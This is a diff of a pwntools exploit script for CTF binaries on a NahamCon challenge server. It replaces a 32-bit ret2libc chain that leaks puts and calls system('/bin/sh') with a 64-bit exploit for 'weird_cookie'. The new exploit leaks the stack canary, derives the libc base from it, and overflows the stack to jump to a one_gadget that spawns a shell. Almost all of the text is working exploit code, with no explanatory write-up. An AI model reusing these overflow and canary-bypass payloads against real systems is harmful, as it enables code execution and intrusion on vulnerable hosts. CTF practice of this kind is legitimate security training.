@@ -1,6 +1,5 @@
 from pwn import *
-
-CONN = "nc challenge.nahamcon.com 31200".split(" ")
+CONN = "nc challenge.nahamcon.com 32546".split(" ")
 HOST = CONN[1]
 PORT = CONN[2]
 
@@ -22,7 +21,7 @@ continue
 )
 
 # Binary filename
-exe = "./oboe"
+exe = "./weird_cookie"
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
@@ -34,9 +33,11 @@ context.log_level = "debug"
 # ===========================================================
 
 # Lib-C library, can use pwninit/patchelf to patch binary
-libc = ELF("./libc6-i386_2.27-3ubuntu1.6_amd64.so")
-# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
-# ld = ELF("./ld-2.27.so")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+ld = ELF("/lib64/ld-linux-x86-64.so.2")
+
+if args.REMOTE:
+    libc = ELF("./libc-2.27.so")
 
 # Start program
 io = start()
@@ -44,38 +45,32 @@ offset = 0
 # Build the payload
 
 # Send the payload
-io.sendlineafter(b"protocol:", b"A" * 64)
-io.sendlineafter(b"domain:", b"B" * 64)
-payload = b"C" * 17
-payload += p32(elf.plt["puts"])
-payload += p32(elf.sym["main"])
-payload += p32(elf.got["puts"])
-payload = payload.ljust(55, b"D")
-payload += b"~"
+io.sendafter(b"?", b"A" * 39 + b"~")
+io.recvuntil(b"~")
+canary = u64(io.recv(8).ljust(8, b"\x00"))
+printf = canary ^ 0x123456789ABCDEF1
+libc.address = printf - libc.sym["printf"]
 
-io.sendlineafter(b"path:", payload)
-io.recvuntil(b"~\n")
+info("canary: " + hex(canary))
+info("printf: " + hex(printf))
+info("libc: " + hex(libc.address))
 
-LEAK_PUTS = u32(io.recv(4))
-
-info("PUTS: " + hex(LEAK_PUTS))
-libc.address = LEAK_PUTS - libc.sym["puts"]
-info("LIBC: " + hex(libc.address))
-# # print(io.recvline)
-
+# Clean buffer
 binsh = libc.search(b"/bin/sh\x00").__next__()
+poprdi = libc.search(asm("pop rdi; ret;")).__next__()
+one_gadget = libc.address + 0x10a2fc
 
-# Send the payload
-io.sendlineafter(b"protocol:", b"A" * 64)
-io.sendlineafter(b"domain:", b"B" * 64)
-payload = b"C" * 17
-payload += p32(libc.symbols["__libc_system"])
-payload += p32(0xdeadbeef)
-payload += p32(binsh)
-payload = payload.ljust(56)
+offset = 40
+payload = flat({
+  offset: [
+    p64(canary),
+    cyclic(8),
+    p64(one_gadget),
+  ] 
+})
 
-io.sendlineafter(b":\n", payload)
-
+io.sendafter(b"again.", payload)
+# info("Canary: " + hex(LEAKED))
 
 # # Got Shell?
 io.interactive()
